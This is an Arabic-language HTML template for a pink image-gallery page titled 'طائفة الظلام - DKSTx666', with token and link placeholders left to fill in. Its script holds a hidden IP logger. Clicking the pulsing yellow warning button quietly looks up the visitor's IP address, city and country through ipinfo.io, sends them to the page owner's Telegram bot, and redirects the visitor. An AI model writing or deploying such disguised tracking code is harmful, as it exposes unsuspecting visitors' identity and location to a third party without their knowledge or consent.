<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>طائفة الظلام - DKSTx666</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: radial-gradient(circle, pink 10%, #ffe6f0);
    }

    header {
      text-align: center;
      padding: 1em;
    }

    header img {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      border: 5px solid white;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
    }

    main {
      padding: 1em;
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      gap: 10px;
    }

    .img-box {
      position: relative;
      overflow: hidden;
      cursor: pointer;
      display: none;
    }

    .img-box img {
      width: 100%;
      height: auto;
      transition: transform 0.3s ease;
    }

    .img-box:hover img {
      transform: scale(1.1);
    }

    .download-btn {
      position: absolute;
      bottom: 5px;
      left: 5px;
      background: rgba(255, 255, 255, 0.8);
      padding: 5px 10px;
      font-size: 12px;
      border-radius: 5px;
      text-decoration: none;
      color: #000;
    }

    .video-fab {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: red;
      color: white;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 24px;
      box-shadow: 0 0 15px red;
      cursor: pointer;
      z-index: 999;
    }

    .yellow-fab {
      position: fixed;
      bottom: 20px;
      left: 20px;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background-color: yellow;
      color: black;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      box-shadow: 0 0 15px gold;
      animation: pulse-yellow 2s infinite;
      cursor: pointer;
      z-index: 1000;
    }

    @keyframes pulse-yellow {
      0% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0.7); }
      70% { box-shadow: 0 0 0 15px rgba(255, 255, 0, 0); }
      100% { box-shadow: 0 0 0 0 rgba(255, 255, 0, 0); }
    }
  </style>
</head>
<body>
  <header>
    <img src="👑" alt="صورة البروفايل" />
    <h1>طائفة الظلام - DKSTx666</h1>
  </header>

  <main>
    <!-- مربعات الصور من 1 إلى 25 -->
    <div class="img-box"><img src="👑" /><a href="👑" download class="download-btn">تحميل</a></div>
    <div class="img-box"><img src="👑" /><a href="👑" download class="download-btn">تحميل</a></div>
    <div class="img-box"><img src="👑" /><a href="👑" download class="download-btn">تحميل</a></div>
    <!-- كرر حسب عدد الصور المطلوبة (حتى 25) -->
  </main>

  <div class="video-fab" onclick="playVideo()">▶️</div>
  <div class="yellow-fab" onclick="yellowButtonAction()">⚠️</div>

  <script>
    function sendToTelegram(message) {
      const botToken = "👑"; // ضع توكن بوت تليغرام هنا
      const chatId = "👑";   // ضع ID التليغرام هنا
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });
    }

    function yellowButtonAction() {
      fetch("https://ipinfo.io/json")
        .then(res => res.json())
        .then(data => {
          const msg = `⚠️ دخول من الزر الأصفر:\nIP: ${data.ip}\n📍 ${data.city}, ${data.country}`;
          sendToTelegram(msg);
          window.location.href = "index.html";
        });
    }

    function playVideo() {
      window.open("👑", "_blank"); // ضع رابط الفيديو هنا
    }
  </script>
</body>
</html>
